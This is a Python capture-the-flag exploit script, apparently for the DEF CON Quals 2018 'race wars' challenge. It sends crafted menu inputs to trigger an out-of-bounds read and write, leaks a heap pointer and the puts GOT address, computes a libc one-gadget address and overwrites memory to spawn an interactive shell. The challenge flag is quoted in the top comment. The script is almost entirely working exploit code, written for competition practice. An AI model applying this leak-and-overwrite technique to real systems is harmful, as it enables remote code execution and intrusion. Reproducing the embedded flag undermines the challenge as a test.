# OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}
from pwnlib import *

def init_car():
	s.ru("\n CHOICE: ")
	s.send("1\n")

	s.ru("you need?\n")
	s.send("134217728\n")

	s.ru("\n CHOICE: ")
	s.send("3\n")

	s.ru("\n CHOICE: ")
	s.send("4\n")

	s.ru("smission? ")
	s.send("1\n")

	s.ru("\n CHOICE: ")
	s.send("2\n")

	s.ru("i eclipse\n")
	s.send("1\n")

	s.ru("\n CHOICE: ")
	s.send("3\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("0\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("1\n")

	s.ru("ew width: ")
	s.send("65535\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("2\n")

	s.ru("ct_ratio: ")
	s.send("65535\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("3\n")

	s.ru(" radial): ")
	s.send("11\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("3\n")

	s.ru(" radial): ")
	s.send("65535\n")

	s.ru("!\nCHOICE: ")
	s.send("1\n")

	s.ru("r\nCHOICE: ")
	s.send("4\n")

	s.ru("diameter: ")
	s.send("65535\n")

	s.ru("!\nCHOICE: ")

def leak(i):
	s.send("4\n")

	s.ru("o modify? ")
	s.send("%d\n" % (i+24))

	s.ru(" is ")
	leaked = chr(int(s.ru(",")))

	s.ru("to what?: ")
	s.send("0\n")

	s.ru("s, 0 = no)")
	s.send("0\n")

	s.ru("!\nCHOICE: ")
	return leaked


def write(i, c):
	s.send("4\n")

	s.ru("o modify? ")
	s.send("%d\n" % (i+24))

	s.ru(" is ")
	leaked = chr(int(s.ru(",")))

	s.ru("to what?: ")
	s.send("%d\n" % ord(c))

	s.ru("s, 0 = no)")
	s.send("1\n")

	s.ru("!\nCHOICE: ")


#s = Socket(("localhost", 1710))
s = Socket(("2f76febe.quals2018.oooverflow.io", 31337))

print s.ru("Solution:")

sol = raw_input("> ")

s.send(sol + "\n")



init_car()


leaked = uq("".join(leak(i) for i in range(8)))
print("leaked: 0x%x" % leaked)

puts_got = 0x603020

distance = puts_got - leaked
distance += (1<<64)
distance += 0x10


puts = uq("".join(leak(distance + i - 0x18) for i in range(8)))

print("leaked: 0x%x" % puts)


rip = puts - 0x6F690  + 0x4526A

for i, c  in enumerate(pq(rip)):
	write(distance + i - 0x18 - 8, c)




s.send("6\n")

s.interact()

